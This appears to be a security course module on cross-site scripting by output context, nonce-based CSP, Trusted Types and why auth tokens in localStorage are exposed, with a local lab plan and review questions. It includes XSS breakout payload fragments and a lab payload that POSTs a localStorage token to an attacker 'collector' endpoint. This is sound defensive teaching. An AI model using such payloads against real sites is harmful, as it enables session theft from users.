# Layer 7 · Topic 3 — XSS by output context, and where you must never put a token

### The takeaway (read this first)

**The one idea:** XSS is the same string-building failure as SQLi, but the
interpreter you are injecting into is the *browser*, and the crucial twist
is that **the correct escaping depends entirely on where the data lands** —
HTML body, an attribute, inside a `<script>`, a URL, a CSS value are five
different sub-languages with five different escaping rules, and getting the
context wrong means your escaping does nothing at all.

**Why it matters in practice:** XSS lives under A05 (Injection) in the
OWASP Top 10:2025, and it is the mechanism that makes the
localStorage-vs-cookie token debate actually matter. An XSS bug plus a token
in `localStorage` is game over: the attacker's injected JavaScript reads the
token and walks away with the session. The *same* XSS bug against a token in
an `HttpOnly` cookie cannot read the token at all — the damage is capped at
what the attacker can do while the page is open.

**You'll know it landed when:** shown a template that echoes user input, you
ask "what context does this land in?" *before* asking "is it escaped?", and
you can explain why storing an auth token in `localStorage` hands it to any
XSS anywhere on the origin while an `HttpOnly` cookie does not.

## The concept

The browser parses your response into a DOM, and **where a piece of text
sits in that parse determines what turns it into executable code**:

| Context | What the escaping must do | What breaks out |
|---|---|---|
| `<div>{x}</div>` | HTML entities: `<` `>` `&` | `<script>` |
| `<a href="{x}">` | attribute escaping **and** URL scheme validation | `javascript:` |
| `<div title='{x}'>` | escape the quote *you actually used* | `'` then ` onmouseover=` |
| `<div {x}>` (unquoted) | nothing saves you — never do this | a bare space |
| `<script>var a = "{x}"</script>` | JS string escaping, including `</script>` | `</script>` closes the block from *inside a string* |
| `<style>a { width: {x} }` | CSS escaping | `expression()`, `url()` |

That table is the whole topic. HTML-escaping a value that lands in a
`javascript:` URL does nothing useful — `&#106;avascript:` still navigates —
and JS-escaping a value that lands in HTML body does nothing useful either.
The escaper and the context must match, which means *something* has to know
the context. In most stacks, that something is you.

The modern defences, in order of strength:

- **Contextual auto-escaping templates.** Jinja2 with `autoescape` and
  React's JSX escape *for the HTML-body context by default*, which handles
  the common case and leaves attribute/URL/script contexts as the sharp
  edges. `dangerouslySetInnerHTML` and Jinja's `| safe` are you turning the
  defence off by hand, in one visible token — which is at least greppable.
- **A strict, nonce-based Content Security Policy.** The browser is given a
  per-response random nonce in the header; only `<script nonce="...">` tags
  carrying that exact value execute. An injected `<script>` cannot guess it,
  so the injection lands in the DOM and does nothing. Pair it with
  `strict-dynamic` so scripts your trusted code loads still work. This is
  the OWASP CSP cheat sheet's current recommendation *over* domain
  allowlists, and the reason is concrete: an allowlist that includes any
  host serving a JSONP endpoint or an outdated Angular build is an allowlist
  that permits arbitrary script execution.
- **Trusted Types** (`require-trusted-types-for 'script'`) closes the DOM
  XSS sinks — `innerHTML`, `document.write`, `eval` — by making them reject
  raw strings, so the dangerous assignment fails at runtime rather than
  succeeding quietly. Browser support moved recently and in your favour;
  **check the current Baseline status on MDN before you rely on it**, and
  treat any advice about it older than about a year as stale.

### The token-storage decision, which is really a blast-radius decision

A token in `localStorage` is readable by **any** JavaScript running on the
origin, so *one* XSS anywhere on the site exfiltrates it — and the attacker
keeps it after you patch, off your origin, until it expires (see Topic 4 for
why "until it expires" is doing a lot of work in that sentence).

A token in an `HttpOnly` cookie is unreadable from JavaScript by
construction. The same XSS can still *make requests as the user* — the
cookie rides along on same-origin `fetch` — but it cannot steal the
credential to use later, from elsewhere. That is a real and specific
reduction in blast radius: from "persistent, portable, survives your fix" to
"live only while the victim has the page open."

So "just use localStorage, it avoids CSRF" is the wrong trade: it swaps a
defensible problem (CSRF, which `SameSite` plus a token handles) for an
indefensible one.

## How each language actually gets there

Three languages, not six. **The interpreter being attacked is the browser**,
which is the same browser regardless of what rendered the page — so the only
language-side variable worth measuring is *how much of the context problem
the template engine solves for you*, and on that axis these three cover the
entire spectrum.

**Python (FastAPI + Jinja2, your stack).** Jinja2's `autoescape` is on for
`.html` in the standard `Environment` helpers but is **off by default in a
bare `Environment()`** — confirm it rather than assuming it. Critically, it
escapes for **one** context, HTML body: `{{ x }}` inside `href="..."` gets
entity-escaped, which does not stop `javascript:alert(1)`, and `{{ x }}`
inside `<script>` gets entity-escaped, which is both insufficient and
corrupting. Jinja does not parse the surrounding HTML, so it cannot know
where the value landed. FastAPI itself returns JSON by default, which pushes
most of the XSS risk into your frontend — and that is precisely why a
FastAPI + SPA team most often gets the *token-storage* half wrong instead:
set the session cookie `HttpOnly; Secure; SameSite=Lax` from the backend
rather than handing a JWT to the SPA to stash.

**Node (React).** JSX auto-escapes text children, and its holes are
enumerable and worth memorising: `dangerouslySetInnerHTML`,
`href={userValue}` with a `javascript:` URL (React warns on this now but
the pattern survives in `<a>`-alikes and router components), and any
`ref`-based direct DOM write. React's contribution is that the escape is
structural — you cannot "forget" it for a text child — while its limit is
identical to Jinja's: it does not model attribute or URL contexts.

**Go (`html/template`).** The one language here that actually solves it.
`html/template` **parses the template as HTML**, tracks which context each
`{{ . }}` is in, and picks a different escaper per context — entity for
body, attribute escaping in attributes, JS-string escaping inside
`<script>`, URL escaping and scheme filtering inside `href`. Put a
`javascript:` URL in an `href` and it emits `#ZgotmplZ` rather than the URL.
This is the only mainstream template engine that makes the context problem
disappear rather than documenting it, and it is a genuine design lesson: the
escaping was made correct-by-construction by making the tool *understand the
output language* instead of treating it as opaque text. Compare to Topic 2's
parameterization and notice they are the same move.

## The experiment

Uses the shared [`lab/`](../lab/README.md) stack: `api` serves a
server-rendered comment page and a small SPA login; `collector` is the
attacker's endpoint on `:8009` and counts the bytes it receives.

**Part A — context.** Reflect one comment field into three places on the
same page: (a) HTML body, (b) an `<a href>` attribute, (c) a `<script>`
variable. Fire the context-appropriate payload at each, with
`TEMPLATE_ESCAPE=auto` and then `off`. Measure, per cell, **how many of the
three payloads executed** (the page posts a beacon to `collector` on
execution, so "executed" is a byte count, not a judgement call).

**Part B — CSP.** Turn on `CSP_MODE=nonce` and re-run every payload that
executed in Part A. The injection still appears in the DOM — confirm that by
reading the served HTML — and the beacon count should tell you whether it
ran. Then run `CSP_MODE=allowlist` with a permissive host list and see
whether the same protection holds.

**Part C — token store.** Set `TOKEN_STORE=local_storage`, log in, and fire
one payload that does
`fetch('http://localhost:8009/x', {method:'POST', body: localStorage.getItem('token') ?? 'null'})`.
Then set `TOKEN_STORE=http_only_cookie` and fire the identical payload.
Measure **bytes received by `collector`** in each case — a real token is a
few hundred bytes, the string `null` is four, and the difference is the
entire argument.

### How you'd know the fix is fake

Three ways this one lies to you. **A CSP that reports and does not enforce**
— `Content-Security-Policy-Report-Only` blocks nothing; check which header
name you actually sent. **A nonce that is not per-response** — if the nonce
is a constant in a config file, the attacker reads it from any page and puts
it in their injected tag, and your CSP is decorative; confirm it changes on
every reload. **An `HttpOnly` cookie that is also mirrored into
`localStorage`** by a well-meaning frontend "so the SPA can read the user
id" — the flag is set, the header looks right, and the token is sitting in
JS-readable storage anyway. Part C catches this one only if you check the
byte count rather than the cookie flags.

## How to run

Part A — the context table — is the language-side variable this topic
measures, and it needs no browser: each program renders the same payload into
four output contexts with the real template engine and prints the emitted
bytes plus a byte-accurate "would this execute" verdict.

```
python3 python/xss_context.py            # Jinja2: escapes body, MISSES javascript: URL
cd golang && go run xss_context.go && cd ..   # html/template: neutralizes every context
```

The React version is idiomatic but blocked on this machine — `react` and
`react-dom` are not in the offline cache — so it needs a one-time online
install, then runs with no build step (it uses `React.createElement`):

```
cd nodejs && npm install && node xss_context.js && cd ..
```

Parts B (CSP nonce vs allowlist) and C (token-store exfiltration, byte count
at `collector`) genuinely require a real headless browser executing inside the
compose network — `curl` can tell you a script was *served*, never that it
*ran*. Those belong to `lab/` once Docker is up; the three programs above
settle the "how much does the engine solve for you" question on their own.

## Predict, then record

1. Which of the four contexts does Jinja2's default autoescape actually
   protect, and which does it miss? Predict the pattern of the first table
   before you fill it.
2. With the nonce CSP on, the injection still appears in the DOM. What
   specifically is the browser checking, and at what point in parsing?
3. Same payload, two token stores. How many bytes does `collector` receive
   in each case, and what is the smallest change to the app that would make
   the `HttpOnly` number match the `localStorage` one?

| Vector | no escaping, no CSP: beacons received | Jinja autoescape: beacons | autoescape + nonce CSP: beacons | autoescape + allowlist CSP: beacons |
|---|---|---|---|---|
| body-context `<script>` |  |  |  |  |
| attribute-context handler |  |  |  |  |
| `javascript:` URL |  |  |  |  |
| `</script>` break-out |  |  |  |  |

| Token store | bytes received by `collector` | requests the XSS made as the user before the page closed |
|---|---|---|
| `local_storage` |  |  |
| `http_only_cookie` |  |  |

**What would mean the experiment is broken, not the prediction:** if the
body-context `<script>` executes under Jinja autoescape, autoescape is off —
check the `Environment` config and the template extension; do not conclude
Jinja is broken. If the nonce CSP blocks the injected script *and* your own
application scripts, your nonce is not being threaded into your own
`<script>` tags: that is a deployment bug, not proof the CSP works, and the
tell is a console full of your own filenames. If `collector` receives zero
bytes in *every* row including the undefended one, the beacon is being
blocked by something upstream of the payload — check `connect-src` in your
own CSP and that `collector` is reachable from the browser container. If the
`HttpOnly` cookie run exfiltrates a real token, you set the cookie without
the flag or you mirrored it into `localStorage`.

## Answer before moving on

1. XSS and SQLi were called the same class of bug. State the class in one
   sentence, and name the third member of it (hint: `os.system`).
2. `SameSite=Lax` cookies plus an `HttpOnly` session are pitched as handling
   CSRF *and* XSS-theft. Give one concrete cross-site attack that
   `SameSite=Lax` still does **not** stop.
3. Why is a nonce-based CSP strictly better than a domain-allowlist CSP for
   stopping XSS? Name the specific thing an allowlist quietly permits.
4. Go's `html/template` solves the context problem by parsing the output
   language. Name the cost of that design — something it can do to a
   legitimate template that Jinja never would — and say why you would still
   take the trade.

## Next up

[Topic 4 — What a JWT actually is, and the revocation problem](../04-jwt-and-revocation/README.md).
Part C of this experiment showed an attacker walking off with a token; the
next topic is about what you can and cannot do about that afterwards, which
turns out to depend on a design decision made months earlier.
